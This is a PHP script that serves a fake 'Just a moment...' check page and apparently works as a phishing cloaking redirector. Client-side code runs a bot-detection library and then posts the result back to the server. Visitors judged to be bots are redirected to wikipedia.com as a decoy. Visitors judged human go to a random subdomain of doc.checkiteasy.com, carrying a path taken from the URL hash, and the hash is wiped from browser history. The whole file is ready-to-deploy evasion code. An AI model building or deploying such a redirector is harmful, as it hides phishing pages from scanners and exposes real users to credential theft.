<?php
const FailedDestination = 'https://wikipedia.com';
const BaseDestination = 'doc.checkiteasy.com'; // Base domain

// Function to generate a random subdomain
function getRandomSubdomain($length = 8) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $randomSubdomain = '';
    for ($i = 0; $i < $length; $i++) {
        $randomSubdomain .= $characters[random_int(0, strlen($characters) - 1)];
    }
    return $randomSubdomain;
}

// Generate random Destination with subdomain
$randomSubdomain = getRandomSubdomain();
$Destination = "https://{$randomSubdomain}." . BaseDestination;

if ($_GET['_js'] ?? false) {
    header('content-type: text/javascript');
    $js = <<<JS
const currentURL = new URL(window.location.href);
const baseURL = `\${currentURL.origin}\${currentURL.pathname}`;
const newURL = `\${baseURL}?_jd=botd`;
import(newURL).then((_b) => _b.load()).then((_b) => _b.detect())
.then((_r) => {
    let value;
    if (window.location.pathname === '/') {
        value = window.location.href.split(/\\#|\\?/)[1];
        if (value) {
            value = '/' + value
        } else {
            value = '/'
        }
    } else {
        value = window.location.pathname;
    }
    window.history.replaceState({}, '', window.location.href.replace(window.location.hash, ''));
    const form = document.createElement('form');
    form.method = 'post';
    const input = document.createElement('input');
    input.type = 'hidden'; 
    input.name = _r.bot ? '_b' : '_r';
    input.value = value;
    form.appendChild(input);
    document.body.appendChild(form);
    
    form.submit()
   
}).catch()
JS;

    exit($js);
}

if ($_GET['_jd'] ?? false) {
    header('content-type: text/javascript');
    exit(file_get_contents('https://openfpcdn.io/botd/v1'));
}

if ($_POST['_b'] ?? false) {
    header('HTTP/1.1 307 Temporary Redirect');
    header('location: ' . FailedDestination);
    exit();
}
if ($_POST['_r'] ?? false) {
    header('HTTP/1.1 307 Temporary Redirect');
    header('location: ' . $Destination . $_POST['_r']);
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Just a moment...</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <script src="?_js=_1"></script>
</head>
<body>
</body>
</html>
